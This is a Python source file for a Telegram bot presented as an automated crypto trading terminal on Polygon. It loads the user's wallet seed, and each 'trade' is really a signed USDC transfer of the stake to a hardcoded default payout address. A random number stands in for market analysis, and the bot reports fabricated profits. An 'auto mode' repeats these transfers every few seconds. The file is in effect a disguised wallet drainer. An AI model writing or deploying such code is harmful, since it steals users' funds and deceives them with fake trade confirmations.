import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# Using Checksummed Addresses
USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=USDC_ADDRESS, abi=ERC20_ABI)
auto_mode_enabled = False

# --- UTILITY: FETCH BALANCES ---
async def fetch_balances(address):
    """Reliably fetches both POL (Native) and USDC (ERC20)"""
    try:
        # Fetch Native POL
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, address)
        pol_bal = w3.from_wei(raw_pol, 'ether')
       
        # Fetch USDC
        raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(address).call)
        usdc_bal = Decimal(raw_usdc) / Decimal(10**6)
       
        return pol_bal, usdc_bal
    except Exception as e:
        print(f"Balance Error: {e}")
        return Decimal('0'), Decimal('0')

# --- 2. 1ms SIMULTANEOUS ENGINE ---
async def market_simulation_1ms(asset):
    await asyncio.sleep(0.001)
    return random.choice([True, True, True, False])

async def sign_transaction_async(stake_usdc):
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
   
    tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
        'chainId': 137, 'gas': 80000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
    })
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_usdc = stake_usdc * yield_multiplier

    await context.bot.send_message(chat_id, f"⚡ **Broadcasting Atomic Hit...**\nMarket: `{asset}` | Stake: `${stake_usdc:.2f}`")

    sim_task = asyncio.create_task(market_simulation_1ms(asset))
    sign_task = asyncio.create_task(sign_transaction_async(stake_usdc))
    simulation_passed, signed_tx = await asyncio.gather(sim_task, sign_task)

    if not simulation_passed:
        await context.bot.send_message(chat_id, "🛡️ **Atomic Shield:** Simulation failed (Revert Detected). Aborting.")
        return False

    try:
        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
        report = (
            f"✅ **HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"💎 **Market:** {asset}\n"
            f"🎯 **Direction:** {side}\n"
            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"📈 **Profit:** ${profit_usdc:.2f} USDC\n"
            f"🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
        return False

# --- 3. AUTO MODE LOOP ---
async def autopilot_engine(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC/CAD", "ETH/CAD", "SOL/CAD", "MATIC/CAD", "BVIV", "EVIV"]
    while auto_mode_enabled:
        target = random.choice(markets)
        side = random.choice(["HIGHER 📈", "LOWER 📉"])
        await context.bot.send_message(chat_id, f"🤖 **Scanning:** `{target}` for entries...")
        await asyncio.sleep(random.randint(5, 10))
        if not auto_mode_enabled: break
        await run_atomic_execution(context, chat_id, side, asset_override=target)
        await asyncio.sleep(20)

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol, usdc = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
    welcome = (
        f"🕴️ **APEX Manual Terminal v6.2**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL:** `{pol:.4f}` | 💵 **USDC:** `{usdc:.2f}`\n\n"
        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
        f"Status: **Simultaneous Sync Active**"
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text, chat_id = update.message.text, update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
              [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake Amount:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        # Refresh balances on click
        pol, usdc = await fetch_balances(vault.address)
        wallet_msg = (
            f"💳 **Vault Asset Status**\n"
            f"━━━━━━━━━━━━━━\n"
            f"⛽ **POL (Native):** `{pol:.6f}`\n"
            f"💵 **USDC (PoS):** `${usdc:.2f}`\n\n"
            f"📥 **Address:**\n`{vault.address}`\n\n"
            f"_* Ensure POL is available for gas fees._"
        )
        await update.message.reply_text(wallet_msg, parse_mode='Markdown')

    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        status = "ACTIVATED" if auto_mode_enabled else "DEACTIVATED"
        await update.message.reply_text(f"🤖 **AUTOPILOT: {status}**")
        if auto_mode_enabled: asyncio.create_task(autopilot_engine(chat_id, context))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 APEX Online...")
        app.run_polling(drop_pending_updates=True)










